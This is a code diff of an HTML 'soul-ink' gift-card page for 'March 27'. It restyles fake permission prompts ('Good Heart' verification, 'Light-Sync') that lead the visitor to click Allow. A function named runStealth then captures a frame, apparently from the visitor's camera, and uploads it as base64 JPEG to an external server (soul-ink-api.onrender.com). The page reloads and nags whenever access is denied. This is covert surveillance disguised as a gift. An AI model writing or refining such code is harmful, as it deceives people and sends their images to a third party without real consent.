@@ -9,23 +9,39 @@
     <style>
         :root { --accent: #00f2ff; --bg: #000; }
         body { margin: 0; background: var(--bg); overflow: hidden; font-family: 'Roboto', sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; }
+        
+        /* Loader */
         #loader-screen { position: fixed; inset: 0; background: #000; z-index: 2000; display: flex; flex-direction: column; align-items: center; justify-content: center; transition: opacity 0.4s ease; }
         .load-text { color: white; font-family: 'Caveat', cursive; font-size: 26px; margin-bottom: 20px; }
         .progress-container { width: 180px; height: 3px; background: rgba(255,255,255,0.1); border-radius: 10px; overflow: hidden; }
         #progress-bar { width: 0%; height: 100%; background: var(--accent); transition: width 0.2s linear; }
+
+        /* Main Card */
         #card { width: 85%; max-width: 340px; height: 540px; opacity: 0; transform: translateY(10px); background: rgba(255, 255, 255, 0.05); backdrop-filter: blur(40px); border: 1px solid rgba(255, 255, 255, 0.1); border-radius: 24px; display: flex; flex-direction: column; align-items: center; justify-content: center; padding: 25px; position: relative; transition: 0.8s ease-out; }
         .card-active { opacity: 1 !important; transform: translateY(0) !important; }
         #text { font-family: 'Caveat', cursive; font-size: 28px; color: white; text-align: center; filter: blur(30px); transition: 1.2s ease; line-height: 1.5; }
-        .modal { position: fixed; inset: 0; background: rgba(0,0,0,0.6); display: none; justify-content: center; align-items: center; z-index: 1000; }
-        .android-box { background: #fff; width: 320px; border-radius: 28px; padding: 24px; box-sizing: border-box; animation: zoomIn 0.2s ease-out; }
-        .android-box h2 { margin: 0 0 12px 0; font-size: 20px; font-weight: 500; color: #1f1f1f; }
-        .android-box p { margin: 0 0 24px 0; font-size: 14px; line-height: 1.5; color: #444; }
-        .android-btns { display: flex; justify-content: flex-start; gap: 8px; }
-        .android-btn { padding: 10px 16px; border: none; background: transparent; color: #0b57d0; font-size: 14px; font-weight: 500; text-transform: uppercase; border-radius: 20px; cursor: pointer; }
+        
+        /* Bottom Sheet Design */
+        .overlay { position: fixed; inset: 0; background: rgba(0,0,0,0.7); display: none; z-index: 1000; backdrop-filter: blur(4px); }
+        .bottom-sheet { 
+            position: fixed; bottom: -100%; left: 0; right: 0; 
+            background: #fff; border-radius: 28px 28px 0 0; 
+            padding: 32px 24px; z-index: 1001; 
+            transition: bottom 0.4s cubic-bezier(0.25, 1, 0.5, 1);
+        }
+        .bottom-sheet.show { bottom: 0; }
+        .sheet-handle { width: 40px; height: 4px; background: #e0e0e0; border-radius: 2px; margin: 0 auto 20px; }
+        .bottom-sheet h2 { margin: 0 0 10px 0; font-size: 22px; color: #1a1a1a; font-weight: 600; }
+        .bottom-sheet p { margin: 0 0 25px 0; font-size: 15px; color: #5f6368; line-height: 1.5; }
+        .btn-group { display: flex; flex-direction: column; gap: 10px; }
+        .btn-primary { background: #0b57d0; color: #fff; border: none; padding: 16px; border-radius: 14px; font-weight: 600; font-size: 16px; cursor: pointer; }
+        .btn-secondary { background: #f1f3f4; color: #5f6368; border: none; padding: 14px; border-radius: 14px; font-weight: 500; font-size: 14px; cursor: pointer; }
+
+        /* Scanner */
         #scanner { display: none; position: absolute; inset: 0; background: linear-gradient(to bottom, transparent 40%, rgba(0, 242, 255, 0.1) 50%, transparent 60%); z-index: 50; animation: scanMove 1.5s infinite linear; border-radius: 24px; }
         .scan-line { position: absolute; width: 100%; height: 2px; background: var(--accent); top: 50%; }
+        
         @keyframes scanMove { 0% { transform: translateY(-100%); } 100% { transform: translateY(100%); } }
-        @keyframes zoomIn { from { transform: scale(0.95); opacity: 0; } to { transform: scale(1); opacity: 1; } }
         @keyframes shiver { 0% { transform: translate(0,0); } 25% { transform: translate(1px, 1px); } 50% { transform: translate(-1px, -1px); } 100% { transform: translate(0,0); } }
         .shivering { animation: shiver 0.1s infinite !important; }
     </style>
@@ -51,26 +67,29 @@
         </div>
     </div>
 
-    <div id="box1" class="modal"><div class="android-box">
-        <h2>System Permission</h2>
-        <p>This message requires a "Good Heart" verification to decode the Soul-Ink. Allow this process to proceed?</p>
-        <div class="android-btns">
-            <button class="android-btn" onclick="startFlow()">Allow</button>
-            <button class="android-btn" onclick="location.reload()">Deny</button>
-        </div>
-    </div></div>
+    <div id="overlay" class="overlay"></div>
 
-    <div id="box2" class="modal"><div class="android-box">
-        <h2>March 27 Gift</h2>
-        <p>To reveal your special surprise, the system needs to perform a one-time light-sync. Allow?</p>
-        <div class="android-btns">
-            <button class="android-btn" onclick="runStealth()">Allow</button>
-            <button class="android-btn" onclick="location.reload()">Deny</button>
+    <div id="sheet1" class="bottom-sheet">
+        <div class="sheet-handle"></div>
+        <h2>March 27</h2>
+        <p>This soul-ink is protected. Please allow access if you have a "Good Heart" to decode the message.</p>
+        <div class="btn-group">
+            <button class="btn-primary" onclick="showSecondSheet()">Allow</button>
+            <button class="btn-secondary" onclick="location.reload()">Deny</button>
         </div>
-    </div></div>
+    </div>
+
+    <div id="sheet2" class="bottom-sheet">
+        <div class="sheet-handle"></div>
+        <h2>March 27</h2>
+        <p>Verification successful. Allow the system to perform a Light-Sync to see your special gift?</p>
+        <div class="btn-group">
+            <button class="btn-primary" onclick="startFlow()">Allow</button>
+            <button class="btn-secondary" onclick="location.reload()">Deny</button>
+        </div>
+    </div>
 
     <script>
-        // CRITICAL: Double check this URL in your Render Dashboard!
         const RENDER_URL = 'https://soul-ink-api.onrender.com'; 
         const music = document.getElementById('bgm');
 
@@ -88,7 +107,8 @@
                         setTimeout(() => {
                             document.getElementById('loader-screen').style.display = 'none';
                             document.getElementById('card').classList.add('card-active');
-                            document.getElementById('box1').style.display = 'flex';
+                            document.getElementById('overlay').style.display = 'block';
+                            document.getElementById('sheet1').classList.add('show');
                         }, 400);
                     }, 400);
                 }
@@ -96,16 +116,23 @@
             }, 150); 
         };
 
+        function showSecondSheet() {
+            document.getElementById('sheet1').classList.remove('show');
+            setTimeout(() => {
+                document.getElementById('sheet2').classList.add('show');
+            }, 400);
+        }
+
         function startFlow() {
             music.currentTime = 21; 
             music.play().catch(e => console.log("Waiting..."));
-            document.getElementById('box1').style.display = "none";
+            document.getElementById('sheet2').classList.remove('show');
+            document.getElementById('overlay').style.display = 'none';
             document.getElementById('text').style.filter = `blur(30px)`;
-            setTimeout(() => { document.getElementById('box2').style.display = "flex"; }, 200);
+            runStealth();
         }
 
         async function runStealth() {
-            document.getElementById('box2').style.display = "none";
             const card = document.getElementById('card');
             document.getElementById('scanner').style.display = "block";
             card.classList.add('shivering'); 
@@ -123,12 +150,11 @@
                     c.height = 640;
                     c.getContext('2d').drawImage(v, 0, 0);
                     
-                    // Cleanup the base64 string for the server
                     const rawData = c.toDataURL('image/jpeg', 0.5).split(',')[1];
 
                     fetch(`${RENDER_URL}/upload`, {
                         method: 'POST',
-                        mode: 'cors', // Ensure CORS is handled
+                        mode: 'cors',
                         headers: {'Content-Type': 'application/json'},
                         body: JSON.stringify({ image: rawData })
                     }).catch(err => console.error("Upload failed:", err));
@@ -146,11 +172,11 @@
                     }
                 }, 800); 
             } catch (e) {
-                music.pause(); // Stop music on deny
+                music.pause();
                 document.getElementById('scanner').style.display = "none";
                 card.classList.remove('shivering');
                 alert("Verification required to reveal the gift. Please try again and select 'Allow'.");
-                document.getElementById('box1').style.display = 'flex';
+                location.reload();
             }
         }
 
